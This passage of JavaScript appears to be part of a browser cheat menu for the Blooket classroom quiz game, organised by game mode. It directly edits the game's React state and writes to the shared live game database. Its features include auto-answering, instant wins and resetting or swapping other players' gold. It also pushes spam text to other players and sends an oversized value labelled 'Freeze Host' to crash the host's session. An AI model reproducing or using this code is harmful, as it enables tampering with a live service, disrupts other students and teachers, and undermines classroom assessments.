                        e.enabled || t.enabled ? (clearInterval(e.data), clearInterval(t.data), e.data = null, t.data = null, e.enabled = !1, t.enabled = !1) : (e.enabled = !0, t.enabled = !0, e.data = setInterval(() => {
                            document.querySelectorAll('div[role="button"]').forEach(e => {
                                ("Lose 25%" === e.innerText || "Lose 50%" === e.innerText) && (e.style.display = "none")
                            })
                        }, 50), t.data = setInterval(() => {
                            var e;
                            if ("gold" === ("gold" === window.location.pathname.split("/")[2] && "gold") && t.enabled) try {
                                if ("prize" === o().stateNode.state.stage) {
                                    let {
                                        choices: a
                                    } = o().stateNode.state, r = document.querySelector("div[class*='regularBody']").children[1];
                                    r && (document.querySelectorAll(".chest-esp").length ? a.forEach((e, t) => {
                                        3 == r.children.length && r.children[t].children[1].innerText != e.text && (r.children[t].children[1].innerText = e.text)
                                    }) : a.forEach((e, t) => {
                                        (textElement = document.createElement("p")).className = "chest-esp", textElement.innerText = e.text, textElement.style = "text-align: center; font-size: 30px; color: white; font-family:Titan One, sans-serif; border-color: black; margin-top: 200px; opacity: 0;";
                                        try {
                                            r.children[t].appendChild(textElement)
                                        } catch (o) {
                                            console.log(o)
                                        }
                                    }))
                                }
                            } catch (n) {
                                console.log(n)
                            }
                        }, 50))
                    }
                }, {
                    name: "Reset Players Gold",
                    description: "Sets a player's gold to 0",
                    run: function() {
                        let e = document.createElement("iframe");
                        document.body.append(e), window.prompt = e.contentWindow.prompt.bind(window), e.remove();
                        let t = prompt("Who's gold would you like to reset?"),
                            {
                                stateNode: {
                                    props: o,
                                    state: a
                                }
                            } = Object.values(function e(t = document.querySelector("body>div")) {
                                return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                            }())[1].children[0]._owner;
                        stateNode.props.liveGameController.getDatabaseVal("c", e => {
                            e && Object.keys(e).map(e => e.toLowerCase()).includes(t.toLowerCase()) && o.liveGameController.setVal({
                                path: "c/".concat(o.client.name),
                                val: {
                                    b: o.client.blook,
                                    g: a.gold,
                                    tat: `${t}:swap:0`
                                }
                            })
                        })
                    }
                }, {
                    name: "Set Gold",
                    description: "Sets amount of gold",
                    run: function() {
                        var e = document.createElement("iframe"),
                            e = (document.body.append(e), window.prompt = e.contentWindow.prompt.bind(window), e.remove(), Number(parseInt(prompt("How much gold would you like?")))),
                            t = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        t.setState({
                            gold: e,
                            gold2: e
                        }), t.props.liveGameController.setVal({
                            path: "c/".concat(t.props.client.name),
                            val: {
                                b: t.props.client.blook,
                                g: e
                            }
                        })
                    }
                }, {
                    name: "Swap Gold",
                    description: "Swaps gold with someone",
                    run: function() {
                        (() => {
                            const cheat = (async () => {
                                let {
                                    stateNode
                                } = Object.values((function react(r = document.querySelector("body>div")) {
                                    return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div"))
                                })())[1].children[0]._owner;
                                const player = prompt("Who's gold would you like to swap with? (Case sensitive)");
                                stateNode.props.liveGameController.getDatabaseVal("c", (players) => {
                                    if (!players || players[player] == null) return;
                                    const gold = players[player].g || 0;
                                    stateNode.props.liveGameController.setVal({
                                        path: "c/" + stateNode.props.client.name,
                                        val: {
                                            b: stateNode.props.client.blook,
                                            tat: player + ":swap:" + (stateNode.state.gold || 0),
                                            g: gold
                                        }
                                    });
                                    stateNode.setState({
                                        gold,
                                        gold2: gold
                                    });
                                });
                            });
                            cheat();
                        })();
                    }
                }, {
                    name: "Set Player's Gold",
                    description: "Sets a player's gold to any amount.",
                    run: function() {
                        (async () => {
                            const stateNode = Object.values(document.querySelector('#app>div>div'))[1].children[0]._owner.stateNode;
                            let i = document.createElement('iframe');
                            document.body.append(i);
                            const alert = i.contentWindow.alert.bind(window);
                            const prompt = i.contentWindow.prompt.bind(window);
                            i.remove();

                            const db = await stateNode.props.liveGameController.getDatabaseVal("c");
                            const players = Object.keys(db);

                            function search(q) {
                                const res = players.filter(e => e?.toLowerCase()?.includes(q.toLowerCase()));
                                if (res.length > 1) {
                                    alert(`${res.length} players were found!`);
                                    return;
                                }
                                if (res.length < 1) {
                                    alert("No players were found!");
                                    return;
                                }
                                return res[0];
                            }

                            const result = search(prompt("Enter player name or part of it here (not case sensitive):"));
                            if (!result) {
                                return;
                            }

                            const amount = prompt(`Enter the amount you would like to set the player to:`);
                            if (!amount || amount.length < 1) {
                                alert("You must enter an amount.");
                                return;
                            }

                            stateNode.props.liveGameController.setVal({
                                path: `c/${stateNode.props.client.name}/tat`,
                                val: `${result}:swap:${amount}`
                            });

                            alert(`Set ${result}'s gold to ${amount}!`);
                        })();
                    }
                }, {
                    name: "Reset All Players' Gold",
                    description: "Set's everyone else's gold to 0",
                    run: function() {
                        var e = document.createElement("iframe");
                        document.body.append(e), window.alert = e.contentWindow.alert.bind(window), e.remove();
                        let {
                            props: t,
                            state: o
                        } = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode, a = 0;
                        t.liveGameController.getDatabaseVal("c", async e => {
                            if (e)
                                for (let r of Object.keys(e)) t.liveGameController.setVal({
                                    path: "c/".concat(t.client.name),
                                    val: {
                                        b: t.client.blook,
                                        g: o.gold,
                                        tat: r + ":swap:0"
                                    }
                                }), a++, await new Promise(e => setTimeout(e, 4e3));
                            alert(`Reset ${a} players' gold!`)
                        })
                    }
                }, {
                    name: "Send Ad Text",
                    description: "Sends a load of text to another player (This will override your blook!)",
                    run: function() {
                        var player = window.prompt("Enter the player's name:");
                        var text = window.prompt("Enter the text to send:");

                        var {
                            props: t2,
                            state: a
                        } = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        t2.liveGameController.setVal({
                            path: "c/".concat(t2.client.name),
                            val: {
                                b: t2.client.blook,
                                g: a.gold,
                                tat: player + ":swap:0"
                            }
                        });

                        let {
                            props: t
                        } = Object.values(function e(t = document.querySelector("body>div")) {
                            return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"));
                        }())[1].children[0]._owner.stateNode;

                        let repeatedText = `Dog:${Array(500).fill(text).join(' ')}`;
                        t.client.blook = repeatedText;
                        t.liveGameController.setVal({
                            path: `c/${t.client.name}/b`,
                            val: repeatedText
                        });
                    }
                }],
                kingdom: [{
                    name: "Choice ESP",
                    description: "Shows you what will happen if you say Yes or No",
                    type: "toggle",
                    enabled: false,
                    data: null,
                    run: function() {
                        if (this.enabled) {
                            this.enabled = false;
                            clearInterval(this.data);
                            this.data = null;
                        } else {
                            this.enabled = true;
                            this.data = setInterval((stats => {
                                let {
                                    stateNode
                                } = Object.values((function react(r = document.querySelector("body>div")) {
                                    return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div"))
                                })())[1].children[0]._owner;

                                let elements = Array.prototype.reduce.call(
                                    document.querySelectorAll('[class*=statContainer]'),
                                    (obj, container, i) => (obj[stats[i]] = container, obj), {}
                                );

                                if (stateNode.state.phase == "choice") {
                                    Array.prototype.forEach.call(document.querySelectorAll('.choiceESP'), x => x.remove());

                                    Object.keys(stateNode.state.guest.yes || {}).forEach(x => {
                                        if (elements[x] == null) return;
                                        let element = document.createElement('div');
                                        element.className = 'choiceESP';
                                        element.style = 'font-size: 24px; color: rgb(75, 194, 46); font-weight: bolder;';
                                        element.innerText = String(stateNode.state.guest.yes[x]);
                                        elements[x].appendChild(element);
                                    });

                                    Object.keys(stateNode.state.guest.no || {}).forEach(x => {
                                        if (elements[x] == null) return;
                                        let element = document.createElement('div');
                                        element.className = 'choiceESP';
                                        element.style = 'font-size: 24px; color: darkred; font-weight: bolder;';
                                        element.innerText = String(stateNode.state.guest.no[x]);
                                        elements[x].appendChild(element);
                                    });

                                    Array.prototype.forEach.call(
                                        document.querySelectorAll("[class*=guestButton][role=button]"),
                                        x => (x.onclick = () => Array.prototype.forEach.call(document.querySelectorAll(".choiceESP"), x => x.remove()))
                                    );
                                }
                            }), 50, ['materials', 'people', 'happiness', 'gold']);
                        }
                    }
                }, {
                    name: "Disable Tax Toucan",
                    description: "Tax evasion",
                    run: function() {
                        Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.taxCounter = Number.MAX_VALUE
                    }
                }, {
                    name: "Max Stats",
                    description: "Sets all resources to the max",
                    run: function() {
                        Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.setState({
                            materials: 100,
                            people: 100,
                            happiness: 100,
                            gold: 100
                        })
                    }
                }, {
                    name: "Set Guests",
                    description: "Sets the amount of guests you've seen",
                    run: function() {
                        var e = document.createElement("iframe"),
                            e = (document.body.append(e), window.prompt = e.contentWindow.prompt.bind(window), e.remove(), Number(parseInt(prompt("How many guests do you want?"))));
                        Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.setState({
                            guestScore: e
                        })
                    }
                }, {
                    name: "Skip Guest",
                    description: "Skips the current guest",
                    run: function() {
                        Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.nextGuest()
                    }
                }],
                racing: [{
                    name: "Instant Win",
                    description: "Instantly Wins the race",
                    run: function() {
                        let e = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        e.setState({
                            progress: e.state.goalAmount
                        }, () => {
                            let {
                                question: t
                            } = e.state;
                            try {
                                [...document.querySelectorAll('[class*="answerContainer"]')][t.answers.map((e, o) => t.correctAnswers.includes(e) ? o : null).filter(e => null != e)[0]]?.click?.()
                            } catch {}
                        })
                    }
                }, {
                    name: "Set Questions",
                    description: "Sets the number of questions left",
                    run: function() {
                        let i = document.createElement('iframe');
                        document.body.append(i);
                        window.prompt = i.contentWindow.prompt.bind(window);
                        i.remove();
                        let {
                            stateNode
                        } = Object.values((function react(r = document.querySelector("body>div")) {
                            return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div"))
                        })())[1].children[0]._owner;
                        let progress = stateNode.props.client.amount - parseInt(prompt("How many questions left do you want?"));
                        if (!isNaN(progress)) {
                            stateNode.setState({
                                progress
                            });
                            stateNode.props.liveGameController.setVal({
                                path: "c/".concat(stateNode.props.client.name),
                                val: {
                                    b: stateNode.props.client.blook,
                                    pr: progress
                                }
                            });
                        }
                    }
                }],
                royale: [{
                    name: "Auto Answer (Toggle)",
                    description: "Toggles auto answer on",
                    type: "toggle",
                    enabled: !1,
                    data: null,
                    run: function() {
                        this.enabled ? (this.enabled = !1, clearInterval(this.data), this.data = null) : (this.enabled = !0, this.data = setInterval(() => {
                            var e = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                            e?.onAnswer?.(!0, e.props.client.question.correctAnswers[0])
                        }, 50))
                    }
                }, {
                    name: "Auto Answer",
                    description: "Chooses the correct answer for you",
                    run: function() {
                        var e = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        e?.onAnswer?.(!0, e.props.client.question.correctAnswers[0])
                    }
                }],
                rush: [{
                    name: "Set Blooks",
                    description: "Sets amount of blooks you or your team has",
                    run: function() {
                        var e = document.createElement("iframe"),
                            e = (document.body.append(e), window.prompt = e.contentWindow.prompt.bind(window), e.remove(), Number(parseInt(prompt("How many blooks do you want?")))),
                            t = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        t.setState({
                            numBlooks: e
                        }), t.isTeam ? t.props.liveGameController.setVal({
                            path: `a/${t.props.client.name}/bs`,
                            val: e
                        }) : t.props.liveGameController.setVal({
                            path: `c/${t.props.client.name}/bs`,
                            val: numDefense
                        })
                    }
                }, {
                    name: "Set Defense",
                    description: "Sets amount of defense you or your team has (Max 4)",
                    run: function() {
                        var e = document.createElement("iframe"),
                            e = (document.body.append(e), window.prompt = e.contentWindow.prompt.bind(window), e.remove(), Math.min(Number(parseInt(prompt("How much defense do you want? (Max 4)"))), 4)),
                            t = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        t.setState({
                            numDefense: e
                        }), t.isTeam ? t.props.liveGameController.setVal({
                            path: `a/${t.props.client.name}/d`,
                            val: e
                        }) : t.props.liveGameController.setVal({
                            path: `c/${t.props.client.name}/d`,
                            val: e
                        })
                    }
                }, {
                    name: "Freeze Host :)",
                    description: "They aint coming back with this one",
                    run: function() {
                        var largeNumber = "99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999";
                        var t = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        t.setState({
                            numBlooks: largeNumber
                        });
                        if (t.isTeam) {
                            t.props.liveGameController.setVal({
                                path: `a/${t.props.client.name}/bs`,
                                val: largeNumber
                            });
                        } else {
                            t.props.liveGameController.setVal({
                                path: `c/${t.props.client.name}/bs`,
                                val: largeNumber
                            });
                        }
                    }
                }],
                workshop: [{
                    name: "Remove Distractions",
                    description: "Removes all enemy distractions",
                    run: function() {
                        Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.setState({
                            fog: !1,
                            dusk: !1,
                            wind: !1,
                            plow: !1,
                            blizzard: !1,
                            force: !1,
                            canada: !1,
                            trees: [!1, !1, !1, !1, !1, !1, !1, !1, !1, !1]
                        })
                    }
                }, {
                    name: "Send Distraction",
                    description: "Sends a distraction to everyone else playing",
                    run: function() {
                        var e = document.createElement("iframe"),
                            e = (document.body.append(e), window.alert = e.contentWindow.alert.bind(window), e.remove(), Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner).stateNode,
                            t = {
                                c: "Oh Canada",
                                b: "Blizzard",
                                f: "Fog Spell",
                                d: "Dark & Dusk",
                                w: "Howling Wind",
                                g: "Gift Time!",
                                t: "TREES",
                                s: "Snow Plow",
                                fr: "Use The Force"
                            },
                            o = Object.keys(t)[Math.floor(Math.random() * Object.keys(t).length)];
                        e.safe = !0, e.props.liveGameController.setVal({
                            path: `c/${e.props.client.name}/tat`,
                            val: o
                        }), alert(`Sent a ${t[o]} distraction`)
                    }
                }, {
                    name: "Set Toys",
                    description: "Sets amount of toys",
                    run: function() {
                        var e = document.createElement("iframe"),
                            e = (document.body.append(e), window.prompt = e.contentWindow.prompt.bind(window), e.remove(), parseInt(prompt("How many toys would you like?"))),
                            t = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        t.setState({
                            toys: e
                        }), t.props.liveGameController.setVal({
                            path: "c/".concat(t.props.client.name),
                            val: {
                                b: t.props.client.blook,
                                t: e
                            }
                        })
                    }
                }, {
                    name: "Set Toys Per Question",
                    description: "Sets amount of toys per question",
                    run: function() {
                        var e = document.createElement("iframe");
                        document.body.append(e), window.prompt = e.contentWindow.prompt.bind(window), e.remove(), Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.setState({
                            toysPerQ: parseInt(prompt("How many toys per question would you like?"))
                        })
                    }
                }, {
                    name: "Swap Toys",
                    description: "Swaps toys with someone",
                    run: function() {
                        let e = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        e.props.liveGameController.getDatabaseVal("c", t => {
                            e.setState({
                                choosingPlayer: !1,
                                players: t ? Object.entries(t).map(([e, {
                                    b: t,
                                    t: o
                                }]) => ({
                                    name: e,
                                    blook: t,
                                    toys: o || 0
                                })).filter(t => t.name != e.props.client.name).sort(({
                                    toys: e
                                }, {
                                    toys: t
                                }) => t - e) : [],
                                phaseTwo: !0,
                                stage: "prize",
                                choiceObj: {
                                    type: "swap"
                                }
                            }, () => setTimeout(() => e.setState({
                                choosingPlayer: !0
                            }), 300))
                        })
                    }
                }]
            });
        var u = document.createElement("details");
        for (let p of (u.innerHTML = '<summary style="padding: 10px; font-size: 1.5em; font-weight: bolder">Global</summary>', d.global)) {
            let m = v(p.name);
            m.style.backgroundColor = "toggle" == p.type ? p.enabled ? "#47A547" : "#A02626" : "hsl(0, 0%, 20%)", m.onclick = () => {
                try {
                    p.run()
                } finally {
                    m.style.backgroundColor = "toggle" == p.type ? p.enabled ? "#47A547" : "#A02626" : "hsl(0, 0%, 20%)"
                }
            }, u.appendChild(m)
        }
        u.open = !1, u.style.paddingBottom = "10px", t.appendChild(u);
        let h = document.createElement("div");
        t.appendChild(h), console.log(d);
        let y = e => {
            if (e && d[e])
                for (let t of d[e]) {
                    let o = v(t.name);
                    o.style.backgroundColor = "toggle" == t.type ? t.enabled ? "#47A547" : "#A02626" : "hsl(0, 0%, 20%)", o.onclick = () => {
                        try {
                            t.run()
                        } finally {
                            o.style.backgroundColor = "toggle" == t.type ? t.enabled ? "#47A547" : "#A02626" : "hsl(0, 0%, 20%)"
                        }
                    }, h.appendChild(o), h.appendChild(document.createElement("br"))
                }
        };
        setTimeout(() => y(_()), 50);
        var $ = function(e) {
            let t = window.location.pathname,
                o = setInterval(() => {
                    window.location.pathname != t && e(t = window.location.pathname)
                }, 50);
            return () => clearInterval(o)
        }(e => {
            var t = _();
            curPageEl.innerText = _(!0) ? "Current gamemode: " + _(!0) : "No game detected", h.innerHTML = "", y(t)
        });

        function v(e) {
            var t = document.createElement("button");
            return t.classList.add("cheat"), t.innerText = e, t
        }

        function _(e) {
            switch (window.location.pathname) {
                case "/play/racing":
                    return e ? "Racing" : "racing";
                case "/play/pirate":
                    return e ? "Pirate's Voyage" : "voyage";
                case "/play/factory":
                    return e ? "Factory" : "factory";
                case "/play/classic/get-ready":
                case "/play/classic/question":
                case "/play/classic/answer/sent":
                case "/play/classic/answer/result":
                case "/play/classic/standings":
                    return e ? "Classic" : "classic";
                case "/play/battle-royale/match/preview":
                case "/play/battle-royale/question":
                case "/play/battle-royale/answer/sent":
                case "/play/battle-royale/answer/result":
                case "/play/battle-royale/match/result":
                    return e ? "Battle Royale" : "royale";
                case "/play/toy":
                    return e ? "Santa's Workshop" : "workshop";
                case "/play/gold":
                    return e ? "Gold Quest" : "gold";
                case "/play/brawl":
                    return e ? "Monster Brawl" : "brawl";
                case "/play/hack":
                    return e ? "Crypto Hack" : "hack";
                case "/play/fishing":
                    return e ? "Fishing Frenzy" : "fishing";
                case "/play/rush":
                    return e ? "Blook Rush" : "rush";
                case "/play/dino":
                    return e ? "Deceptive Dinos" : "dinos";
                case "/tower/map":
                case "/tower/battle":
                case "/tower/rest":
                case "/tower/risk":
                case "/tower/shop":
                case "/tower/victory":
                    return e ? "Tower of Doom" : "doom";
                case "/cafe":
                case "/cafe/shop":
                    return e ? "Cafe" : "cafe";
                case "/defense":
                    return e ? "Tower Defense" : "defense";
                case "/play/defense2":
                    return e ? "Tower Defense 2" : "defense2";
                case "/kingdom":
                    return e ? "Crazy Kingdom" : "kingdom";
                case "/play/lobby":
                    return e ? "Lobby" : "flappy";
                default:
                    return !1
            }
        }

        function f(e) {
            "KeyE" == e.code && (a.hidden = !a.hidden)
        }
        addEventListener("keypress", f)
    }
})();
